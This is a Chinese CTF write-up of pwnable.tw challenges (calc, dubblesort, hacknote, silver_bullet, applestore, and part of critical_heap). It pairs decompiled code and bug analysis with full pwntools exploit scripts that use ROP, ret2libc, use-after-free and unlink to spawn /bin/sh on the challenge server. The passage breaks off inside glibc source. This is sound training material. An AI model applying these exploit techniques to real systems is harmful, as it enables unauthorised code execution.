parse_expr((int)&amp;s, &amp;v1) ) &#123; printf((const char *)&amp;_d, v2[v1 - 1]); fflush(stdout); &#125; &#125; return __readgsdword(0x14u) ^ v4;&#125;init_pool():_DWORD *__cdecl init_pool(_DWORD *a1)&#123; _DWORD *result; // eax signed int i; // [esp+Ch] [ebp-4h] result = a1; *a1 = 0; for ( i = 0; i &lt;= 99; ++i ) &#123; result = a1; a1[i + 1] = 0; &#125; return result;&#125; 重点函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120signed int __cdecl parse_expr(int a1, _DWORD *a2)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int O; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int num_left; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = a1; O = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) &#123; if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) &#123; v2 = i + a1 - v5; s1 = (char *)malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) // 输入不能为0 &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; num_left = atoi(s1); if ( num_left &gt; 0 ) &#123; v4 = (*a2)++; // v4为操作数数目 a2[v4 + 1] = num_left; // 操作数放入a2[1],a2[2],.... &#125; if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\\t&apos; ) // 若下一个操作数仍未操作符即报错 &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + a1; if ( s[O] ) // s[0]为操作数数目 &#123; switch ( *(char *)(i + a1) ) &#123; case &apos;%&apos;: case &apos;*&apos;: case &apos;/&apos;: if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; ) &#123; eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); &#125; else &#123; s[++O] = *(_BYTE *)(i + a1); &#125; break; case &apos;+&apos;: case &apos;-&apos;: eval(a2, s[O]); s[O] = *(_BYTE *)(i + a1); break; default: eval(a2, s[O--]); break; &#125; &#125; else &#123; s[O] = *(_BYTE *)(i + a1); &#125; if ( !*(_BYTE *)(i + a1) ) break; &#125; &#125; while ( O &gt;= 0 ) eval(a2, s[O--]); return 1;&#125;func eval():_DWORD *__cdecl eval(_DWORD *a1, char a2)&#123; _DWORD *result; // eax if ( a2 == &apos;+&apos; ) &#123; a1[*a1 - 1] += a1[*a1]; &#125; else if ( a2 &gt; &apos;+&apos; ) &#123; if ( a2 == &apos;-&apos; ) &#123; a1[*a1 - 1] -= a1[*a1]; &#125; else if ( a2 == &apos;/&apos; ) &#123; a1[*a1 - 1] /= a1[*a1]; &#125; &#125; else if ( a2 == &apos;*&apos; ) &#123; a1[*a1 - 1] *= a1[*a1]; &#125; result = a1; --*a1; return result; // 每一次计算的结果储存在 a1[1]&#125; 分析 看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。 程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数 用num来表示a1 则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是： num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2] 看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100 num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101 可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100] 也就可以泄露栈内存了！！ 第二步，假如输入 +100+12，计算逻辑便是： num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12 //为什么12会在num[101]处 总之，这样子便能对任意栈地址写了！！ 由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary） 因为输入输出什么的都是数字，所以系统调用最为明智。 exp!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *sh = process(&apos;./calc&apos;)bin = ELF(&apos;./calc&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10100) !!!! ROPgadget --binary ./calc --ropchain !!!!直接生成完整的rop链，简直不要太可怕from struct import pack# Padding goes herep = &apos;&apos;p+=p32(0x804967a)p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;/bin&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; retp += &apos;//sh&apos;p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; retp += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .datap += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebxp += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; retp += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; retp += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80for i in range(len(p)/4-1): sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))sh.sendline(&apos;&apos;)sh.interactive()$ whoamicalc 下面这个是相对正常的exp。。。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import * p=remote(&apos;chall.pwnable.tw&apos;,10100)#p=process(&quot;./calc&quot;)key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]p.recv()p.sendline(&apos;+360&apos;)addr_bp=int(p.recv())addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16addr_str=addr_re+20-0x100000000addr=361for i in range(5): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))p.recv()for i in range(5,8): p.sendline(&apos;+&apos;+str(addr+i)) ans=int(p.recv()) if key[i]&lt;ans: ans=ans-key[i] p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans)) else: ans=key[i]-ans p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans)) p.recv()p.send(&apos;kirin&apos;+&apos;\\n&apos;)p.interactive()$ whoamicalc dubble sort冒泡排序，小小的漏洞，简直就是课设车祸现场hhh只找到了第一个漏洞，泄露下地址，然后gg 题目12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax int *v4; // edi unsigned int v5; // esi unsigned int v6; // esi int v7; // ST08_4 int result; // eax unsigned int num; // [esp+18h] [ebp-74h] int v10; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int canary; // [esp+7Ch] [ebp-10h] canary = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, (int)&quot;What your name :&quot;); read(0, &amp;buf, 0x40u); // 没有截断，泄露libc基地址 __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;num); //没有限制输入个数，之后能栈溢出 v3 = num; if ( num ) &#123; v4 = &amp;v10; v5 = 0; do &#123; __printf_chk(1, (int)&quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); ++v5; v3 = num; ++v4; &#125; while ( num &gt; v5 ); &#125; // // // dubblesort((unsigned int *)&amp;v10, v3); // 出人意料的没有漏洞。。。。 // puts(&quot;Result :&quot;); // print if ( num ) &#123; v6 = 0; do &#123; v7 = *(&amp;v10 + v6); __printf_chk(1, (int)&quot;%u &quot;); ++v6; &#125; while ( num &gt; v6 ); &#125; // // // result = 0; if ( __readgsdword(0x14u) != canary ) process_end(); return result;&#125; 分析刚开始输入name，然后会将其打印出来，因为read没有\\x00截断，所以可以泄露出栈内存泄露libc基地址。 之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。 大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh 整体思路便是ret2libc 他们不知道怎么发现的如果在排序的时候输入 + 会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出。。。之前输出的数据一直很少，没发现。。 ps:新的寻找/bin/sh的方法！！1hexdump -C ./libc_32.so.6|grep /bin -A 1 而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。 exp先把大佬的放上来吧。。之后自己调成功了再放自己的。。。 1234567891011121314151617181920212223242526from pwn import * got_off = 0x1b0000system_off = 0x3a940bin_sh_off = 0x158e8b p = remote(&quot;chall.pwnable.tw&quot;,10101)p.recv()p.sendline(&apos;a&apos;*24)got_addr = u32(p.recv()[30:34])-0xalibc_addr = got_addr-got_offsystem_addr = libc_addr + system_offbin_sh_addr = libc_addr + bin_sh_offp.sendline(&apos;35&apos;)p.recv()for i in range(24): p.sendline(&apos;0&apos;) p.recv()p.sendline(&apos;+&apos;)p.recv()for i in range(9): p.sendline(str(system_addr)) p.recv()p.sendline(str(bin_sh_addr))p.recv()p.interactive() 参考：https://bbs.pediy.com/thread-228226.htm hacknote看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、 题目三个功能，添加，打印，删除、 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899unsigned int add()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( idx &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); // ptr[i] *ptr // if ( !ptr[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *(_DWORD *)ptr[i] = sub_804862B; // // // // printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; // // // // printf(&quot;Content :&quot;); read(0, *((void **)ptr[i] + 1), size); puts(&quot;Success !&quot;); ++idx; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125;unsigned int print()&#123; int idx; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= ::idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[idx] ) (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]); return __readgsdword(0x14u) ^ v3;&#125;unsigned int sub_80487D4()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= idx ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( ptr[v1] ) &#123; free(*((void **)ptr[v1] + 1)); // ptr[v1] puts指针 // ptr[v1]+1 content指针 free(ptr[v1]); // uaf puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; 分析add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身这里需要使用system的参数截断，例如 “||sh”或者”;sh” 感觉正在用着残破不堪的工具。。要完了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *def add(size,content): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;size :&quot;) sh.sendline(size) sh.recvuntil(&quot;Content :&quot;) sh.sendline(content)def delete(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index) def print(index): sh.recvuntil(&quot;choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(index)#sh = process(&apos;./hacknote&apos;)sh = remote(&quot;chall.pwnable.tw&quot;, 10102)elf=ELF(&quot;./hacknote&quot;)libc=ELF(&quot;./libc_32.so.6&quot;)read_got=elf.got[&quot;read&quot;]putnote=0x804862badd(&quot;16&quot;,15*&quot;a&quot;)add(&quot;16&quot;,15*&quot;a&quot;)delete(&apos;0&apos;)delete(&apos;1&apos;)add(&apos;8&apos;,p32(putnote)+p32(read_got))print(&apos;0&apos;) read_addr=u32(sh.recv()[:4])print hex(read_addr)sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] delete(&apos;2&apos;) add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\\x00&quot;)print(&apos;0&apos;)sh.interactive() silver_bullet风格比较有意思的一个题目 题目三个选项:1.create_bullet description最大为0x30，2.power_up 若description小于0x30,最多可以增加至0x30，3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。 重点函数 123456789101112131415161718192021int __cdecl power_up(char *bullet_ptr)&#123; char s; // [esp+0h] [ebp-34h] size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(&amp;s, 0, 0x30u); if ( !*bullet_ptr ) return puts(&quot;You need create the bullet first !&quot;); if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu ) return puts(&quot;You can&apos;t power up any more !&quot;); printf(&quot;Give me your another description of bullet :&quot;); read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12)); v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12); printf(&quot;Your new power is : %u\\n&quot;, v3); *((_DWORD *)bullet_ptr + 12) = v3; return puts(&quot;Enjoy it !&quot;);&#125; 分析乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上因为程序的存在一个结构 1234struct bullet&#123; char bullet_ptr[0x30] int length&#125; 而strncat合并字符串时，合并完之后会在后面加上\\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。 exp本地测试莫名其妙过不了，但是远程没问题。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *#context.log_level = &apos;debug&apos;#sh = process (&apos;./silver_bullet&apos;)sh = remote(&apos;chall.pwnable.tw&apos;,10103)elf = ELF(&apos;./silver_bullet&apos;)libc = ELF(&apos;libc_32.so.6&apos;)def create(con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def powerup(con): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;of bullet :&apos;) sh.send(con)def beat(): sh.sendline(&apos;3&apos;)pop_ebx_ret = 0x8048475create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;zzzz&apos;pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])pay += p32(elf.symbols[&apos;main&apos;])powerup(pay)beat()sh.recvuntil(&apos;win !!\\n&apos;)puts_addr = u32(sh.recv(4))system_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\\x00&apos;).next()success(&quot;system_addr : &quot; + hex(system_addr))success(&quot;binsh_addr : &quot; + hex(binsh_addr))create(&apos;a&apos;*(0x30-1))powerup(&apos;1&apos;)pay = &apos;\\xff&apos;*3 + &apos;bbbb&apos;pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)powerup(pay)beat()sh.recv()sh.interactive() applestore好难啊啊啊啊啊，心累的不行，看大佬的wp回回血 ps: 假如在 libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。 题目主要功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int menu()&#123; puts(&quot;=== Menu ===&quot;); printf(&quot;%d: Apple Store\\n&quot;, 1); printf(&quot;%d: Add into your shopping cart\\n&quot;, 2); printf(&quot;%d: Remove from your shopping cart\\n&quot;, 3); printf(&quot;%d: List your shopping cart\\n&quot;, 4); printf(&quot;%d: Checkout\\n&quot;, 5); return printf(&quot;%d: Exit\\n&quot;, 6);&#125;unsigned int handler()&#123; char nptr; // [esp+16h] [ebp-22h] unsigned int v2; // [esp+2Ch] [ebp-Ch] v2 = __readgsdword(0x14u); while ( 1 ) &#123; printf(&quot;&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: list(); break; case 2: add(); break; case 3: delete(); break; case 4: cart(); break; case 5: checkout(); break; case 6: puts(&quot;Thank You for Your Purchase!&quot;); return __readgsdword(0x14u) ^ v2; default: puts(&quot;It&apos;s not a choice! Idiot.&quot;); break; &#125; &#125;&#125; 其他函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135unsigned int add() //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。&#123; char **v1; // [esp+1Ch] [ebp-2Ch] char nptr; // [esp+26h] [ebp-22h] unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Device Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: v1 = create((int)&quot;iPhone 6&quot;, (char *)199); insert((int)v1); goto LABEL_8; case 2: v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299); insert((int)v1); goto LABEL_8; case 3: v1 = create((int)&quot;iPad Air 2&quot;, (char *)499); insert((int)v1); goto LABEL_8; case 4: v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399); insert((int)v1); goto LABEL_8; case 5: v1 = create((int)&quot;iPod Touch&quot;, (char *)199); insert((int)v1);LABEL_8: printf(&quot;You&apos;ve put *%s* in your shopping cart.\\n&quot;, *v1); puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;); break; default: puts(&quot;Stop doing that. Idiot!&quot;); break; &#125; return __readgsdword(0x14u) ^ v3;&#125;int cart()&#123; signed int v0; // eax signed int v2; // [esp+18h] [ebp-30h] int cost; // [esp+1Ch] [ebp-2Ch] _DWORD *i; // [esp+20h] [ebp-28h] char buf; // [esp+26h] [ebp-22h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = __readgsdword(0x14u); v2 = 1; cost = 0; printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;); fflush(stdout); my_read(&amp;buf, 0x15u); if ( buf == &apos;y&apos; ) &#123; puts(&quot;==== Cart ====&quot;); //遍历链表来输出cart for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] ) &#123; v0 = v2++; printf(&quot;%d: %s - $%d\\n&quot;, v0, *i, i[1]); // i[1] == money cost += i[1]; &#125; &#125; return cost;&#125;unsigned int delete()&#123; signed int v1; // [esp+10h] [ebp-38h] _DWORD *v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int FD; // [esp+1Ch] [ebp-2Ch] int BK; // [esp+20h] [ebp-28h] char nptr; // [esp+26h] [ebp-22h] unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = (_DWORD *)mycart; printf(&quot;Item Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); v3 = atoi(&amp;nptr); while ( v2 ) &#123; if ( v1 == v3 ) //典型的unlink &#123; FD = v2[2]; BK = v2[3]; if ( BK ) *(_DWORD *)(BK + 8) = FD; if ( FD ) *(_DWORD *)(FD + 12) = BK; printf(&quot;Remove %d:%s from your shopping cart.\\n&quot;, v1, *v2); return __readgsdword(0x14u) ^ v7; &#125; ++v1; v2 = (_DWORD *)v2[2]; &#125; return __readgsdword(0x14u) ^ v7;&#125;unsigned int checkout()&#123; int v1; // [esp+10h] [ebp-28h] char *v2; // [esp+18h] [ebp-20h] int v3; // [esp+1Ch] [ebp-1Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) &#123; puts(&quot;*: iPhone 8 - $1&quot;); asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;); v3 = 1; insert((int)&amp;v2); v1 = 7175; &#125; printf(&quot;Total: $%d\\n&quot;, v1); puts(&quot;Want to checkout? Maybe next time!&quot;); return __readgsdword(0x14u) ^ v4;&#125; 分析在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。结构str大概如下： 1234str[0]: coststr[1]: name---&gt; 实际为指针str[2]: FDstr[3]: BK 而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。 同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表. 1234567# checksec applestore[*] &apos;/root/pwnable/applestore/applestore&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。 除此以外，需要栈地址的泄露，可以： 利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack 我们可以用environ变量加上libc的基址来得到栈地址。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *#sh = process(&apos;./applestore&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10104)bin = ELF(&apos;./applestore&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def buy(idx): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Device Number&gt; &apos;) sh.sendline(str(idx))def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(str(idx))def dele2(con): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(con)def show(con): sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(con)def checkout(): sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(&apos;y&apos;)for i in range(20): buy(2)for i in range(6): buy(1)checkout()pay = &apos;y\\x00&apos;pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]envp = libc.symbols[&apos;environ&apos;]system = libc.symbols[&apos;system&apos;]success(&apos;libc_base: &apos;+hex(libc.address))success(&apos;envp: &apos;+hex(envp))pay = &apos;y\\x00&apos;pay+=p32(envp)+p32(1)+p32(0)+p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)stack_envp = u32(sh.recv(4))success(&apos;stack_envp: &apos;+hex(stack_envp)) //通过environ泄露栈地址//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.ebp = stack_envp-0x104atoi_got = bin.got[&apos;atoi&apos;]pay = &apos;27&apos;pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)dele2(pay)pay = &apos;$0\\x00\\x00&apos;+p32(system)sh.sendline(pay)sh.interactive() critical_heap难到仅有的wp基本上完全看不懂。。。 题目题目比较长，功能比较丰富。。 分析出来的结构体： 1234567891011121314151617181920212223242526272829303132struct clock&#123; int *name; int inuse; 0xDEADBEEF; char[4] year; char[4] month; char[4] day; char[4] hour; char[4] minute; char[4] second;&#125;; struct system&#123; int *name; int inuse; 0x48694869; string PathOfSystem; string DetailOfSystem; char[4] UserOfSystem; char[4] NameOfSystem; char[4] rand;&#125;; struct normal&#123; int *name; int inuse; 0x13371337; char[40] content; int sig;&#125;; 分析完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。 localtime和setenv配合能将任意文件内容写到heap上. chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）. 在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的). 第一步需要看localtime的源码：以libc2.23源码为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166/* Return the `struct tm&apos; representation of *T in local time. */struct tm *localtime (const time_t *t)&#123; return __tz_convert (t, 1, &amp;_tmbuf);&#125;libc_hidden_def (localtime)/* Return the `struct tm&apos; representation of *TIMER in the local timezone. Use local time if USE_LOCALTIME is nonzero, UTC otherwise. */struct tm *__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)&#123; long int leap_correction; int leap_extra_secs; if (timer == NULL) &#123; __set_errno (EINVAL); return NULL; &#125; __libc_lock_lock (tzset_lock); /* Update internal database according to current TZ setting. POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname. This is a good idea since this allows at least a bit more parallelism. */ tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1); if (__use_tzfile) __tzfile_compute (*timer, use_localtime, &amp;leap_correction, &amp;leap_extra_secs, tp); &lt;--无关代码省略--&gt; return tp;&#125;/* Interpret the TZ envariable. */static voidinternal_functiontzset_internal (int always, int explicit)&#123; static int is_initialized; const char *tz; if (is_initialized &amp;&amp; !always) return; is_initialized = 1; /* Examine the TZ environment variable. */ tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值 if (tz == NULL &amp;&amp; !explicit) /* Use the site-wide default. This is a file name which means we would not see changes to the file if we compare only the file name for change. We want to notice file changes if tzset() has been called explicitly. Leave TZ as NULL in this case. */ tz = TZDEFAULT; if (tz &amp;&amp; 